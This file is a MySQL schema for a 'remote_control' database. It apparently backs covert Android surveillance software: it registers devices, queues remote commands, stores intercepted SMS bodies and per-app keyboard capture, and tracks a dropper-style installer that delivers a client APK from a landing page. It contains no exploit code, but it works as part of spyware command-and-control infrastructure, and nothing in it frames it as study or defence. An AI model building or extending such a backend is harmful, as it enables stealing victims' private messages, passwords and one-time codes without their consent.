CREATE DATABASE IF NOT EXISTS remote_control
  DEFAULT CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;

USE remote_control;

CREATE TABLE IF NOT EXISTS devices (
  id            VARCHAR(36)  NOT NULL PRIMARY KEY,
  android_id    VARCHAR(128) NOT NULL,
  model         VARCHAR(128) NULL,
  token         VARCHAR(64)  NOT NULL,
  last_heartbeat_at DATETIME NULL,
  is_online     TINYINT      NOT NULL DEFAULT 0,
  created_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  UNIQUE KEY uk_devices_android_id (android_id),
  UNIQUE KEY uk_devices_token (token),
  KEY idx_devices_online (is_online),
  KEY idx_devices_heartbeat (last_heartbeat_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS commands (
  id            VARCHAR(36)  NOT NULL PRIMARY KEY,
  device_id     VARCHAR(36)  NOT NULL,
  cmd           VARCHAR(64)  NOT NULL,
  params        JSON         NULL,
  status        VARCHAR(20)  NOT NULL DEFAULT 'pending',
  result        JSON         NULL,
  error_message VARCHAR(512) NULL,
  created_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  completed_at  DATETIME     NULL,
  KEY idx_commands_device (device_id),
  KEY idx_commands_status (status),
  KEY idx_commands_created (created_at),
  CONSTRAINT fk_commands_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS sms_logs (
  id            VARCHAR(36)  NOT NULL PRIMARY KEY,
  device_id     VARCHAR(36)  NOT NULL,
  sender        VARCHAR(64)  NOT NULL,
  body          TEXT         NOT NULL,
  sms_type      TINYINT      NOT NULL DEFAULT 1,
  source        VARCHAR(20)  NOT NULL DEFAULT 'realtime',
  client_sms_id VARCHAR(64)  NULL,
  received_at   DATETIME     NOT NULL,
  created_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  UNIQUE KEY uk_sms_client (device_id, client_sms_id),
  KEY idx_sms_device (device_id),
  KEY idx_sms_received (received_at),
  CONSTRAINT fk_sms_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS keyboard_logs (
  id            VARCHAR(36)  NOT NULL PRIMARY KEY,
  device_id     VARCHAR(36)  NOT NULL,
  app_package   VARCHAR(256) NULL,
  app_label     VARCHAR(256) NULL,
  text_content  TEXT         NOT NULL,
  event_type    INT          NULL,
  captured_at   DATETIME     NOT NULL,
  created_at    DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_keyboard_device (device_id),
  KEY idx_keyboard_captured (captured_at),
  CONSTRAINT fk_keyboard_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS apk_download_logs (
  id                 VARCHAR(36)  NOT NULL PRIMARY KEY,
  android_id         VARCHAR(128) NULL,
  model              VARCHAR(128) NULL,
  installer_package  VARCHAR(256) NULL,
  apk_url            VARCHAR(512) NULL,
  status             VARCHAR(32)  NOT NULL DEFAULT 'success',
  error_message      VARCHAR(512) NULL,
  client_ip          VARCHAR(64)  NULL,
  user_agent         VARCHAR(512) NULL,
  downloaded_at      DATETIME     NOT NULL,
  created_at         DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_apk_dl_downloaded (downloaded_at),
  KEY idx_apk_dl_android (android_id),
  KEY idx_apk_dl_status (status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS device_groups (
  id          VARCHAR(36)  NOT NULL PRIMARY KEY,
  name        VARCHAR(128) NOT NULL,
  sort_order  INT          NOT NULL DEFAULT 0,
  created_at  DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at  DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  UNIQUE KEY uk_device_groups_name (name),
  KEY idx_device_groups_sort (sort_order)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS installer_install_logs (
  id                 VARCHAR(36)  NOT NULL PRIMARY KEY,
  android_id         VARCHAR(128) NULL,
  model              VARCHAR(128) NULL,
  brand              VARCHAR(128) NULL,
  installer_package  VARCHAR(256) NULL,
  version_name       VARCHAR(64)  NULL,
  version_code       INT          NULL,
  client_ip          VARCHAR(64)  NULL,
  user_agent         VARCHAR(512) NULL,
  installed_at       DATETIME     NOT NULL,
  created_at         DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_installer_install_at (installed_at),
  KEY idx_installer_install_android (android_id),
  KEY idx_installer_install_pkg (installer_package)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS client_install_logs (
  id                 VARCHAR(36)  NOT NULL PRIMARY KEY,
  android_id         VARCHAR(128) NULL,
  model              VARCHAR(128) NULL,
  brand              VARCHAR(128) NULL,
  client_package     VARCHAR(256) NULL,
  installer_package  VARCHAR(256) NULL,
  version_name       VARCHAR(64)  NULL,
  version_code       INT          NULL,
  client_ip          VARCHAR(64)  NULL,
  user_agent         VARCHAR(512) NULL,
  installed_at       DATETIME     NOT NULL,
  created_at         DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  KEY idx_client_install_at (installed_at),
  KEY idx_client_install_android (android_id),
  KEY idx_client_install_pkg (client_package)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS landing_page_views (
  id BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  page_key VARCHAR(64) NOT NULL DEFAULT 'miluHome',
  client_ip VARCHAR(64) NULL,
  user_agent VARCHAR(512) NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_landing_views_page_created (page_key, created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
